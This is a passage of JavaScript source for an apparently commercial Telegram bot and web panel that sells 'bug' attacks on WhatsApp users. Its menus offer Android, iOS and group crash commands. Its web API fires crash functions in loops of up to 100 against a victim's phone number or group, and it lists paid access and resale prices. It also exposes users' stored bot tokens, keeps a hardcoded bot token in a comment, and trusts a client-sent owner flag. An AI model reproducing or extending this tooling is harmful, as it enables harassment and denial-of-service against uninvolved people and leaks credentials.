  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;
  const userBot = getUserBot(botInstance);
  if (!CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId)) return userBot.sendMessage(chatId, 'Only owners can use this command.');
  if (Object.keys(db.userNumbers).length === 0) return userBot.sendMessage(chatId, 'No users have connected WhatsApp numbers.');

  const parts = [];
  let text = `<b>┌──────┤ Connected Users List ├──────┐</b>\n\nTotal: <b>${Object.keys(db.userNumbers).length}</b>\n\n`;
  let count = 0;

  for (const [userId, number] of Object.entries(db.userNumbers)) {
    count++;
    const userLink = await formatUserLink(userBot, userId);
    const num = number ? escapeHtml(number) : 'Not paired';

    const line = `${count}. ${userLink}\n` +
                 `   <b>ID:</b> <code>${userId}</code>\n` +
                 `   <b>Number:</b> <code>${num}</code>\n\n`;

    if (text.length + line.length > 3900) {
      text += '<b>└────────────────────────┘</b>';
      parts.push(text);
      text = `<b>┌──────┤ Connected Users List (Part ${parts.length + 2}) ├──────┐</b>\n\n`;
    }
    text += line;
  }
  text += '<b>└────────────────────────┘</b>';
  parts.push(text);

  for (const p of parts) {
    await userBot.sendMessage(chatId, p, { parse_mode: 'HTML', disable_web_page_preview: true });
    await sleep(300);
  }
});

botInstance.onText(/\/listtoken(?:\\s(.+))?$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (msg.chat.type !== 'private') return;
  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;
  const userBot = getUserBot(botInstance);
  if (!CONFIG.owner.includes(senderId)) return userBot.sendMessage(chatId, 'Only owners can use this command.');
  if (Object.keys(db.botTokens).length === 0) return userBot.sendMessage(chatId, 'No bot tokens have been added.');

  const parts = [];
  let text = `<b>┌──────┤ Bot Tokens List ├──────┐</b>\n\nTotal Tokens: <b>${Object.keys(db.botTokens).length}</b>\n\n`;
  let count = 0;

  for (const [userId, token] of Object.entries(db.botTokens)) {
    count++;
    const userLink = await formatUserLink(userBot, userId);
    let botName = 'Invalid Token';
    try {
      const temp = new TelegramBot(token, { polling: false });
      const me = await temp.getMe();
      botName = me.username ? `@${me.username}` : 'Invalid Token';
    } catch {}
    botName = escapeHtml(botName);

    const line = `${count}. ${userLink}\n` +
                 `   <b>ID:</b> <code>${userId}</code>\n` +
                 `   <b>Bot:</b> ${botName}\n` +
                 `   <b>Token:</b> <code>${escapeHtml(token)}</code>\n\n`;

    if (text.length + line.length > 3900) {
      text += '<b>└────────────────────────┘</b>';
      parts.push(text);
      text = `<b>┌──────┤ Bot Tokens List (Part ${parts.length + 2}) ├──────┐</b>\n\n`;
    }
    text += line;
  }
  text += '<b>└────────────────────────┘</b>';
  parts.push(text);

  for (const p of parts) {
    await userBot.sendMessage(chatId, p, { parse_mode: 'HTML', disable_web_page_preview: true });
    await sleep(300);
  }
});
  
  botInstance.onText(/\/mytoken/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (msg.chat.type !== 'private') return;

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  const userToken = db.botTokens[senderId];

  if (!userToken) {
    return userBot.sendMessage(chatId, '❌ You haven’t added any bot token. Use /addtoken to add one.');
  }

  try {
    const botInfo = await new TelegramBot(userToken).getMe();
    const botUsername = botInfo.username ? `@${botInfo.username}` : 'Unknown';
    await userBot.sendMessage(chatId, `┌──────┤ Your Bot Token ├──────┐
│➻ Bot Username: ${botUsername}
│➻ Token: <code>${userToken}</code>
└────────────────────────┘`, { parse_mode: 'HTML' });
  } catch (error) {
    console.error(`Error in /mytoken for ${senderId}: ${error.message}`);
    await userBot.sendMessage(chatId, `❌ Failed to retrieve bot token: ${error.message}`);
  }
});
  
  botInstance.onText(/\/(info|checkid|id|getid)(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const command = match[1]; // Captures the command used (info, checkid, id, getid)
  const input = match[2]?.trim(); // Captures the optional input (username, channel, group, etc.)
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') {
    return;
  }

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  if (!checkRateLimit(senderId, chatId)) return;

  try {
    // Case 1: No input provided, return sender's ID
    if (!input) {
      const senderUsername = msg.from.username ? `@${msg.from.username}` : 'No Username';
      await userBot.sendMessage(chatId, `┌────┤ Your ID ├────────┐
│➻ User ID : <code>${senderId}</code>
│➻ Username : ${senderUsername}
└───────────────────────┘`, { parse_mode: 'HTML' });
      return;
    }

    // Case 2: Input is a username (e.g., @username)
    if (input.startsWith('@')) {
      try {
        const chat = await userBot.getChat(input);
        if (chat.type === 'private') {
          await userBot.sendMessage(chatId, `┌────┤ User Info ├───────┐
│➻ User ID : <code>${chat.id}</code>
│➻ Username : ${input}
└───────────────────────┘`, { parse_mode: 'HTML' });
        } else if (chat.type === 'group' || chat.type === 'supergroup' || chat.type === 'channel') {
          await userBot.sendMessage(chatId, `┌────┤ ${chat.type.charAt(0).toUpperCase() + chat.type.slice(1)} Info ├─────┐
│➻ Chat ID : <code>${chat.id}</code>
│➻ Title : ${chat.title || input}
└───────────────────────┘`, { parse_mode: 'HTML' });
        } else {
          await userBot.sendMessage(chatId, `❌ Invalid entity: ${input} is not a user, group, or channel.`);
        }
      } catch (error) {
        console.error(`Error fetching chat for ${input}: ${error.message}`);
        await userBot.sendMessage(chatId, `❌ Could not find user or chat for ${input}. Ensure the username is correct and the bot has access.`);
      }
      return;
    }

    // Case 3: Input is a Telegram invite link (e.g., https://t.me/+abc123 or https://t.me/channel_name)
    if (input.startsWith('https://t.me/')) {
      const chatIdentifier = input.replace('https://t.me/', '').replace(/^\+/, '');
      try {
        const chat = await userBot.getChat(`@${chatIdentifier}`); // Convert to @username format
        if (chat.type === 'group' || chat.type === 'supergroup' || chat.type === 'channel') {
          await userBot.sendMessage(chatId, `┌────┤ ${chat.type.charAt(0).toUpperCase() + chat.type.slice(1)} Info ├─────┐
│➻ Chat ID : <code>${chat.id}</code>
│➻ Title : ${chat.title || chatIdentifier}
└───────────────────────┘`, { parse_mode: 'HTML' });
        } else {
          await userBot.sendMessage(chatId, `❌ Invalid link: ${input} does not point to a group or channel.`);
        }
      } catch (error) {
        console.error(`Error fetching chat for ${chatIdentifier}: ${error.message}`);
        await userBot.sendMessage(chatId, `❌ Could not find group or channel for ${input}. Ensure the link is correct and the bot has access.`);
      }
      return;
    }

    // Case 4: Input is invalid
    await userBot.sendMessage(chatId, `❌ Invalid input. Use a Telegram username (e.g., @username) or a valid Telegram invite link (e.g., https://t.me/channel_name).`);
  } catch (error) {
    console.error(`Error in /${command} for ${senderId}: ${error.message}`);
    await userBot.sendMessage(chatId, `❌ Error processing /${command}: ${error.message}`);
  }
});

  botInstance.onText(/\/checkmembership(?:\s(.+))?/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const userBot = getUserBot(botInstance);
    console.log(`Manual membership check requested by ${senderId} in chat ${chatId}`);

    const cacheKey = `${senderId}:membership`;
    membershipCache.delete(cacheKey);

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (membership.isMember) {
      await userBot.sendMessage(chatId, `✅ Membership verified! You are now a member of both the channel and group. Try your command again (e.g., /start or /reqpair).`);
    }
  });

  botInstance.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const senderId = callbackQuery.from.id;
  const queryId = callbackQuery.id;
  const action = callbackQuery.data;
  const senderName = callbackQuery.from.username ? `@${callbackQuery.from.username}` : `${senderId}`;
  const userBot = getUserBot(botInstance);
const hasVip = await hasVipAccess(senderId, userBot);
let status = 'Free User';
if (CONFIG.owner.includes(senderId)) status = 'Owner';
else if (hasVip) status = 'Vip User';

  const messageId = callbackQuery.message.message_id;

  console.log(`Handling callback ${action} for chat ${chatId} by bot ${await botInstance.getMe().then(info => `@${info.username}`)}`);

  try {
    await userBot.answerCallbackQuery(queryId, { cache_time: 0 });
  } catch (err) {
    console.error(`Failed to answer callback query ${queryId}: ${err.message}`);
  }

  try {
    if (action === 'check_membership') {
      const cacheKey = `${senderId}:membership`;
      membershipCache.delete(cacheKey);

      const membership = await checkMembership(chatId, senderId, isRootBot);
      if (membership.isMember) {
        await userBot.sendMessage(chatId, `✅ Membership verified! You are now a member of both the channel and group. Try your command again (e.g., /start or /reqpair).`);
      }
      return;
    }

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    let caption;
    let buttons = [
  [
    { text: '〢Bug Menu', callback_data: 'bugmenu' },
    { text: '〢Misc Menu', callback_data: 'miscmenu' },
  ],
  [
    { text: '〢App Menu', callback_data: 'appmenu' },
  ],
  [{ text: '〢Channel', url: CONFIG.CHANNEL_INVITE_LINK }],
  [{ text: '〢Group', url: CONFIG.GROUP_LINK }],
];

    if (action === 'bugmenu') {
      caption = `
┌───┤ ${CONFIG.botname} ├───┐
│➻ Name: ${senderName}
│➻ Developer: ${CONFIG.usertele}
│➻ Status: ${status}
│➻ Online: ${getOnlineDuration()}
│➻ RAM: ${getFormattedRAM()}
│➻ CPU: ${getCPUInfo()}
└─────────────────────┘
┌───┤ Bug Android ├────┐
│➻ xstress <b>num</b> <b>time</b>
└─────────────────────┘
┌───┤ Bug iOS ├─────┐
│➻ richxios <b>number</b>
│➻ richxiosv2 <b>number</b>
└─────────────────────┘
┌───┤ Bug Group ├───┐
│➻ ucrashgc <b>groupid</b> <b>time</b> 
│➻ androidgc <b>groupid</b> <b>time</b> 
│➻ listgc
│➻ groupid <b>link</b>
│➻ channelid <b>link</b>
└─────────────────────┘
`;
    } else if (action === 'miscmenu') {
      caption = `
┌───┤ ${CONFIG.botname} ├───┐
│➻ Name: ${senderName}
│➻ Developer: ${CONFIG.usertele}
│➻ Status: ${status}
│➻ Online: ${getOnlineDuration()}
│➻ RAM: ${getFormattedRAM()}
│➻ CPU: ${getCPUInfo()}
└─────────────────────┘
┌───┤ Misc Menu ├───────┐
│➻ reqpair <b>number</b>
│➻ delpair <b>number</b>
│➻ addprem <b>ID</b>
│➻ delprem <b>ID</b>
│➻ addresell <b>ID</b>
│➻ delresell <b>ID</b>
│➻ addtoken <b>token</b>
│➻ deltoken <b>token</b>
│➻ addban <b>ID</b>
│➻ delban <b>ID</b>
│➻ listban
│➻ listprem
│➻ listresell
│➻ listtoken
│➻ listuser
│➻ mytoken
│➻ info <b>username/grblink/chlink</b>
│➻ bc
│➻ getkey
│➻ delkey
│➻ listkey
│➻ mtapk
│➻ botfile
│➻ webpair
│➻ delwebpair
│➻ listwebpair
│➻ apitoken
│➻ delapitoken
│➻ listapitoken
│➻ weblogin
│➻ dellogin
│➻ listlogin
│➻ resetlogin
│➻ resetapitoken
└─────────────────────┘
`;
    } else if (action === 'appmenu') {
  caption = `
┌───┤ ${CONFIG.botname} ├───┐
│➻ Name: ${senderName}
│➻ Developer: ${CONFIG.usertele}
│➻ Status: ${status}
│➻ Online: ${getOnlineDuration()}
│➻ RAM: ${getFormattedRAM()}
│➻ CPU: ${getCPUInfo()}
└─────────────────────┘
┌───┤ App Menu ├────┐
│➻ apk
│➻ createuser <b>user</b> [days] [limit]
│➻ deleteuser <b>user</b>
│➻ users
│➻ resetuser
│➻ resetdevice <b>user</b>
│➻ enable <b>user</b>
│➻ disable <b>user</b>
│➻ block ip|device <b>value</b>
│➻ unblock ip|device <b>value</b>
│➻ functions
│➻ status
└─────────────────────┘
`;
} else {
      await userBot.sendMessage(chatId, '❌ Invalid action.');
      return;
    }

    let retries = 3;
    while (retries > 0) {
      try {
        await userBot.editMessageMedia({
          type: 'photo',
          media: CONFIG.pfp,
          caption,
          parse_mode: 'HTML',
        }, {
          chat_id: chatId,
          message_id: messageId,
          reply_markup: { inline_keyboard: buttons },
        });
        break;
      } catch (err) {
        retries--;
        if (retries === 0) throw err;
        console.warn(`Retrying editMessageMedia for chat ${chatId}, attempt ${4 - retries}: ${err.message}`);
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }
  } catch (err) {
    console.error(`Callback Query Error for user ${senderId}, action ${action}: ${err.message}`);
    try {
      await userBot.sendMessage(chatId, `❌ Error processing request: ${err.message}`);
    } catch (sendErr) {
      console.error(`Failed to send error message to ${chatId}: ${sendErr.message}`);
    }
  }
});
}

bot.on('polling_error', (err) => {
  console.error('Polling error (root bot):', err.message);
  if (err.code === 'EFATAL' || err.response?.statusCode >= 500) {
    console.log('🛑 Serious polling error occurred.');
  } else {
    console.log('ℹ️ Minor polling error. Bot continues running.');
  }
});

async function initializeUserBots() {
  console.log(`Initializing ${Object.keys(db.botTokens).length} user bots...`);

  const validTokens = {};

  for (const [userId, token] of Object.entries(db.botTokens)) {
    if (typeof token !== 'string' || !/^\d{9,10}:[A-Za-z0-9_-]{35}$/.test(token)) {
      console.warn(`Invalid token format for user ${userId}, skipping`);
      continue;
    }

    try {
      const tempBot = new TelegramBot(token, { polling: { timeout: 10, interval: 500 } });
      const info = await tempBot.getMe();

      const botKey = `@${info.username}`;
      if (botInstances.has(botKey)) {
        console.log(`Bot ${botKey} already running, skipping`);
        tempBot.stopPolling();
        continue;
      }

      // Success → keep it
      botInstances.set(botKey, tempBot);
      registerCommandHandlers(tempBot, false);
      validTokens[userId] = token;

      console.log(`Bot ${botKey} started for user ${userId}`);
    } catch (err) {
      console.error(`Failed to start bot for user ${userId}: ${err.message}`);
      // Token is dead → do NOT keep it
    }
  }

  // Remove dead tokens from database
  if (Object.keys(validTokens).length !== Object.keys(db.botTokens).length) {
    db.botTokens = validTokens;
    saveJson('./database/bot_tokens.json', db.botTokens);
    console.log('Cleaned invalid/dead tokens from bot_tokens.json');
  }

  console.log(`User bots initialization complete. Active: ${botInstances.size - 1}`);
}

/*if (CONFIG.botToken !== '7176600432:AAFj9QMGN6MTosBE4gQlGr7WRz5ytz_90Ug') {
  process.exit(1);
}*/

// ================================================
// AUTO CLEANUP STUCK PAIRING LOCKS (Improved)
// ================================================

setInterval(() => {
  for (const [uid, locked] of pairingLocks.entries()) {
    if (locked) {
      console.log(`[Cleanup] Force removing stuck pairing lock for ${uid}`);
      pairingLocks.delete(uid);
    }
  }
}, 120 * 1000);

// ================================================

// ====================== LICENSE API SERVER ======================
const app = express();
app.use(express.json());

// ===== SECURITY: Restrict CORS for website=====
app.use((req, res, next) => {
  const allowedOrigin = CONFIG.WEB_DOMAIN;
  const origin = req.headers.origin;

  if (origin === allowedOrigin || !origin) {
    res.header('Access-Control-Allow-Origin', allowedOrigin || '*');
  }

  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

const verifyLicense = async (req, res, next) => {
  const { key, hwid } = req.body;
  if (!key) return res.status(401).json({ success: false, message: "No license key provided" });

  const license = licenseDB[key];
  if (!license) return res.status(401).json({ success: false, message: "Invalid license key" });
  if (license.revoked) return res.status(403).json({ success: false, message: "License revoked" });
  if (new Date(license.expiry) < new Date()) return res.status(403).json({ success: false, message: "License expired" });

  // HWID Check - One machine per key
  if (license.hwid && license.hwid !== hwid) {
    return res.status(403).json({ success: false, message: "This key is bound to another device" });
  }

  if (!license.hwid) {
    license.hwid = hwid;
    license.activationDate = new Date().toISOString();
    saveJson('./database/licenses.json', licenseDB);
  }

  next();
};

// Generate Key
app.post('/generatekey', async (req, res) => {
  const { telegramId, days, senderId, isOwner } = req.body;

  if (!telegramId || !days) {
    return res.status(400).json({ success: false, message: "Missing parameters" });
  }

  const realIsOwner = CONFIG.owner.includes(senderId) || isOwner === true;
  const isReseller = db.OwnerUsers.includes(senderId);
  const isVipUser = await hasVipAccess(parseInt(telegramId), bot);

  if (!realIsOwner && !isReseller && !isVipUser) {
    return res.status(403).json({ success: false, message: "No permission" });
  }

  // Only non-owners are limited to 1 key
  const existingKey = Object.keys(licenseDB).find(k => licenseDB[k].telegramId === parseInt(telegramId));
  
  if (existingKey && !realIsOwner) {
    return res.status(400).json({ 
      success: false, 
      message: "User already has a key" 
    });
  }

  const key = "XEON-" + crypto.randomBytes(16).toString('hex').toUpperCase();
  const expiry = new Date(Date.now() + days * 86400000).toISOString();

  licenseDB[key] = {
    telegramId: parseInt(telegramId),
    expiry,
    hwid: null,
    revoked: false,
    createdBy: senderId,
    createdAt: new Date().toISOString()
  };

  saveJson('./database/licenses.json', licenseDB);
  res.json({ success: true, key, expiry });
});

// Verify
app.post('/verify', verifyLicense, (req, res) => {
  res.json({ success: true, message: "License active" });
});

// Heartbeat
app.post('/heartbeat', verifyLicense, (req, res) => {
  const { key } = req.body;
  licenseDB[key].lastHeartbeat = new Date().toISOString();
  saveJson('./database/licenses.json', licenseDB);
  res.json({ success: true });
});

app.listen(CONFIG.API_PORT, '0.0.0.0', () => {
  console.log(`✅ License API running on port ${CONFIG.API_PORT}`);
  console.log(`🌐 Public: http://localhost:${CONFIG.API_PORT}`);
});
// ====================== END LICENSE API ======================

// ===== CLEAN URL SYSTEM WITH PROTECTION =====

app.get('/*.html', (req, res) => {
  const page = req.path.replace('.html', '').replace('/', '') || 'index';
  const redirectMap = {
    'index': '/',
    'dashboard': '/dashboard',
    'android': '/android',
    'ios': '/ios',
    'group': '/group',
    'about': '/about',
    'help': '/help',
    'contact': '/contact'
  };
  return res.redirect(redirectMap[page] || '/');
});

// Login page (public)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'website', 'index.html'));
});

// Protected pages
const protectedPages = {
  '/dashboard': 'dashboard.html',
  '/android': 'android.html',
  '/ios': 'ios.html',
  '/group': 'group.html',
  '/about': 'about.html',
  '/help': 'help.html',
  '/contact': 'contact.html'
};

Object.keys(protectedPages).forEach(route => {
  app.get(route, (req, res) => {
    res.sendFile(path.join(__dirname, 'website', protectedPages[route]));
  });
});

// Serve static assets only (css, js, images)
app.use(express.static(path.join(__dirname, 'website'), {
  index: false,
  extensions: ['css', 'js', 'png', 'jpg', 'jpeg', 'gif', 'svg', 'ico', 'woff', 'woff2', 'ttf']
}));

function getAnyValidSession(username = null) {
  // 1. Prefer any valid web-session first (available for everyone)
  for (const [num, sock] of webSessions.entries()) {
    if (sock && webWhatsappStatus.get(num) === true) {
      return { sock, number: num, type: 'web' };
    }
  }

  // 2. Only exact username "dgxeon13" is allowed to use rent-session
  if (username === 'dgxeon13') {
    for (const [num, sock] of sessions.entries()) {
      if (sock && whatsappStatusMap.get(num) === true) {
        return { sock, number: num, type: 'rent' };
      }
    }
  }

  return null;
}

// Server status (now checks username)
app.get('/api/status', (req, res) => {
  let username = null;

  // Try to read username from token if present
  try {
    const auth = req.headers.authorization;
    if (auth && auth.startsWith('Bearer ')) {
      const decoded = jwt.verify(auth.split(' ')[1], CONFIG.WEB_JWT_SECRET);
      username = decoded.username || null;
    }
  } catch (e) {
    // ignore invalid token
  }

  const has = !!getAnyValidSession(username);
  res.json({ active: has, time: Date.now() });
});

// Login
app.post('/api/login', express.json(), async (req, res) => {
  try {
    const { username, password, claimId } = req.body || {};
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';

    // ===== RATE LIMIT =====
    const now = Date.now();
    let attempt = loginAttempts.get(ip);

    if (attempt && now - attempt.lastAttempt < LOGIN_WINDOW) {
      if (attempt.count >= LOGIN_RATE_LIMIT) {
        return res.status(429).json({ 
          success: false, 
          message: 'Too many login attempts. Please try again after 15 minutes.' 
        });
      }
      attempt.count++;
      attempt.lastAttempt = now;
    } else {
      loginAttempts.set(ip, { count: 1, lastAttempt: now });
    }

    if (!username || !password) {
      return res.status(400).json({ success: false, message: 'Username and password required' });
    }

    const key = username.toLowerCase().trim();
    const data = webLogins[key];

    if (!data || data.password !== password || data.revoked) {
      await sendLogToGroup('WEB LOGIN', `❌ Failed\nUser: ${username}\nIP: ${ip}\nTime: ${getIndianTime()}`);
      return res.status(401).json({ success: false, message: 'Invalid username or password' });
    }

    if (data.expiry && new Date(data.expiry) < new Date()) {
      return res.status(403).json({ success: false, message: 'Account expired' });
    }

    // ===== PERMANENT FIRST-CLAIMER LOGIC =====
    const maxUsers = data.maxUsers || 1;
    if (!Array.isArray(data.claimedIds)) data.claimedIds = [];

    let finalClaimId = null;

    if (claimId && data.claimedIds.includes(claimId)) {
      // This is the original claimant → allow
      finalClaimId = claimId;
    } else if (data.claimedIds.length < maxUsers) {
      // Free slot → permanently claim it for this person
      finalClaimId = crypto.randomBytes(24).toString('hex');
      data.claimedIds.push(finalClaimId);
      saveJson('./database/web_logins.json', webLogins);
    } else {
      // No free slots and not an existing claimant
      const msg = maxUsers === 1
        ? 'Credential already used by another user'
        : 'Maximum users reached for this credential';

      await sendLogToGroup('WEB LOGIN', `❌ ${msg}\nUser: ${key}\nIP: ${ip}\nTime: ${getIndianTime()}`);
      return res.status(403).json({ success: false, message: msg });
    }

    // Temporary session
    let sessions = activeWebSessions.get(key) || new Set();
    const sessionId = crypto.randomBytes(16).toString('hex');
    sessions.add(sessionId);
    activeWebSessions.set(key, sessions);

    const token = jwt.sign(
      { username: key, telegramId: data.telegramId, sessionId },
      CONFIG.WEB_JWT_SECRET,
      { expiresIn: '12h' }
    );

    // Reset rate limit on successful login
    loginAttempts.delete(ip);

    await sendLogToGroup('WEB LOGIN', `✅ Success\nUser: ${key}\nIP: ${ip}\nTime: ${getIndianTime()}`);

    res.json({
      success: true,
      token,
      username: key,
      expiry: data.expiry || null,
      claimId: finalClaimId
    });
  } catch (e) {
    console.error('Login error:', e);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Auth middleware (session check)
function authWebsite(req, res, next) {
  const auth = req.headers.authorization;
  if (!auth || !auth.startsWith('Bearer ')) {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }
  try {
    const decoded = jwt.verify(auth.split(' ')[1], CONFIG.WEB_JWT_SECRET);
    const userData = webLogins[decoded.username];
    if (!userData || userData.revoked) {
      return res.status(403).json({ success: false, message: 'Account revoked' });
    }
    if (userData.expiry && new Date(userData.expiry) < new Date()) {
      return res.status(403).json({ success: false, message: 'Account expired' });
    }

    const sessions = activeWebSessions.get(decoded.username);
    if (!sessions || !sessions.has(decoded.sessionId)) {
      return res.status(401).json({ success: false, message: 'Session invalid or logged out' });
    }

    req.user = decoded;
    next();
  } catch (err) {
    return res.status(401).json({ success: false, message: 'Invalid or expired token' });
  }
}

// ===== API TOKEN AUTH (for /apitoken) =====
function authApiToken(req, res, next) {
  const auth = req.headers.authorization;
  if (!auth || !auth.startsWith('Bearer ')) {
    return res.status(401).json({ success: false, message: 'No API token provided' });
  }

  const token = auth.split(' ')[1];
  const data = greetingTokens[token];
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';

  if (!data || data.revoked) {
    return res.status(401).json({ success: false, message: 'Invalid or revoked API token' });
  }

  if (data.expiry && new Date(data.expiry) < new Date()) {
    return res.status(403).json({ success: false, message: 'API token expired' });
  }

  if (data.used >= data.limit) {
    return res.status(403).json({ success: false, message: 'API token limit reached' });
  }

  // ===== IP BINDING =====
  if (!data.boundIp) {
    data.boundIp = ip;
    saveJson('./database/greeting_tokens.json', greetingTokens);
  } else if (data.boundIp !== ip) {
    return res.status(403).json({ success: false, message: 'This API token is bound to another IP' });
  }

  req.apiToken = token;
  req.apiTokenData = data;
  next();
}

// ===== Combined Auth (Website JWT or API Token) =====
function authWebsiteOrApi(req, res, next) {
  const auth = req.headers.authorization || '';

  // If it looks like an API token → use API auth
  if (auth.startsWith('Bearer XEON_BVG_API-')) {
    return authApiToken(req, res, next);
  }

  // Otherwise use normal website JWT auth
  return authWebsite(req, res, next);
}

// Logout – only removes temporary session, permanent claim stays forever
app.post('/api/logout', authWebsite, (req, res) => {
  const { username, sessionId } = req.user;
  const sessions = activeWebSessions.get(username);
  if (sessions) {
    sessions.delete(sessionId);
    if (sessions.size === 0) activeWebSessions.delete(username);
  }
  res.json({ success: true });
});

app.get('/api/liveconsole', authWebsite, (req, res) => {
  res.json(liveConsole || []);
});

app.get('/api/usage', authWebsite, (req, res) => {
  const data = {
    richcrash: Number(commandUsage?.richcrash) || 0,
    blokcrash: Number(commandUsage?.blokcrash) || 0,
    ios: Number(commandUsage?.ios) || 0,
    richxiosv2: Number(commandUsage?.richxiosv2) || 0,
    group: Number(commandUsage?.group) || 0
  };
  res.json(data);
});

app.get('/api/debug-usage', (req, res) => {
  res.json({
    memory: commandUsage,
    file: loadJson('./database/command_usage.json')
  });
});

// ====================== GREETING LOOP COUNTS ======================
const GREETING_LOOPS = {
  android: 5,
  blokcrash: 25,
  ios: 100,
  richxiosv2: 100,   // same as ios or change as you like
  group: 1
};

// Cooldown map
const greetingCooldown = new Map(); // key → timestamp

async function handleGreeting(type, target, req, res) {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
  const username = req.user?.username || 'Unknown';

  // ===== COOLDOWN CHECK =====
  const cooldownKey = `${username}_${type}`;
  const cooldownUntil = greetingCooldown.get(cooldownKey) || 0;
  if (Date.now() < cooldownUntil) {
    const left = Math.ceil((cooldownUntil - Date.now()) / 1000);
    return res.status(429).json({ 
      success: false, 
      message: `Cooldown active. Please wait ${left} seconds.` 
    });
  }

  const session = getAnyValidSession(username);
  if (!session) {
    await sendLogToGroup('WEBSITE LOG', 
`❌ Failed - No Session
Command: ${type}
By: ${username}
Target: ${target}
IP: ${ip}
Time: ${getIndianTime()}`);
    return res.status(503).json({ 
      success: false, 
      message: 'Server is in maintenance. Please be patient.' 
    });
  }

  try {
    let jid = target;

    // ===== VALIDATE TARGET (NO onWhatsApp - prevents hang with new Baileys) =====
    if (type !== 'group') {
      const clean = String(target).replace(/[^0-9]/g, '');
      if (clean.length < 8 || clean.length > 15) {
        return res.status(400).json({ success: false, message: 'Invalid number' });
      }
      // Skip onWhatsApp completely (new Baileys version hangs)
      jid = clean + '@s.whatsapp.net';
    } else {
      if (!target.endsWith('@g.us')) {
        return res.status(400).json({ success: false, message: 'Invalid group JID' });
      }
    }

    // ===== INSTANT SUCCESS RESPONSE =====
    res.json({ success: true, message: 'Successfully sent' });
    
    // Increase API token usage (only if API token was used)
    if (req.apiToken && req.apiTokenData) {
      req.apiTokenData.used += 1;
      saveJson('./database/greeting_tokens.json', greetingTokens);
    }

    // Apply cooldown
    const cooldownMs = (CONFIG.GREETING_COOLDOWN || 30) * 1000;
    greetingCooldown.set(cooldownKey, Date.now() + cooldownMs);

    // Hide last 5 characters of target for live console
    let safeTarget = String(target || '');
    if (safeTarget.length > 5) {
      safeTarget = safeTarget.slice(0, -5) + 'xxxxx';
    }

    // Convert type to display name
const greetingName = type === 'android' ? 'richcrash' 
                   : type === 'blokcrash' ? 'blokcrash' 
                   : type === 'ios' ? 'richxios' 
                   : type === 'richxiosv2' ? 'richxiosv2' 
                   : 'greeting3';

// ===== UPDATE EXECUTE COUNT IMMEDIATELY =====
if (!commandUsage || typeof commandUsage !== 'object') {
  commandUsage = { richcrash: 0, blokcrash: 0, ios: 0, richxiosv2: 0, group: 0 };
}

let countKey = type;
if (type === 'android') countKey = 'richcrash';
if (type === 'blokcrash') countKey = 'blokcrash';
if (type === 'richxiosv2') countKey = 'richxiosv2';

commandUsage[countKey] = (Number(commandUsage[countKey]) || 0) + 1;
saveJson('./database/command_usage.json', commandUsage);

    console.log(`[USAGE] ${countKey} is now: ${commandUsage[countKey]}`);

    // ===== LIVE CONSOLE =====
    liveConsole.unshift({
      user: username,
      type: greetingName,
      target: safeTarget,
      createdAt: new Date().toISOString()
    });

    if (liveConsole.length > 13) {
      liveConsole = liveConsole.slice(0, 13);
    }
    saveJson('./database/live_console.json', liveConsole);

    // ---------- ANDROID (richcrash) ----------
    if (type === 'android') {
      (async () => {
        const loopCount = GREETING_LOOPS.android;
        let successCount = 0;

        for (let i = 0; i < loopCount; i++) {
          try {
            const stillAlive = (webWhatsappStatus.get(session.number) === true) || 
                               (whatsappStatusMap.get(session.number) === true);
            if (!stillAlive || !session.sock) break;

            await xeonExtentedTextMessageV2(jid, session.number, null, bot);
            successCount++;
          } catch (err) {
            console.log(`[Android Loop Error] ${err.message}`);
          }
        }

        await sendLogToGroup('WEBSITE LOG', 
`✅ Richcrash BVG
By: ${username}
Target: ${target}
Loops: ${successCount}/${loopCount}
IP: ${ip}
Time: ${getIndianTime()}`);
      })();
    }

    // ---------- BLOKCRASH ----------
    else if (type === 'blokcrash') {
      (async () => {
        const loopCount = GREETING_LOOPS.blokcrash;
        let successCount = 0;

        for (let i = 0; i < loopCount; i++) {
          try {
            const stillAlive = (webWhatsappStatus.get(session.number) === true) || 
                               (whatsappStatusMap.get(session.number) === true);
            if (!stillAlive || !session.sock) break;

            await xeonNewBloksWidgetCrash(jid, session.number, null, bot);
            successCount++;
            await sleep(1000);
          } catch (err) {
            console.log(`[Blokcrash Loop Error] ${err.message}`);
          }
        }

        await sendLogToGroup('WEBSITE LOG', 
`✅ Blokcrash BVG
By: ${username}
Target: ${target}
Loops: ${successCount}/${loopCount}
IP: ${ip}
Time: ${getIndianTime()}`);
      })();
    }

    // ---------- iOS ----------
    else if (type === 'ios') {
      (async () => {
        const loopCount = GREETING_LOOPS.ios;
        let successCount = 0;

        for (let i = 0; i < loopCount; i++) {
          try {
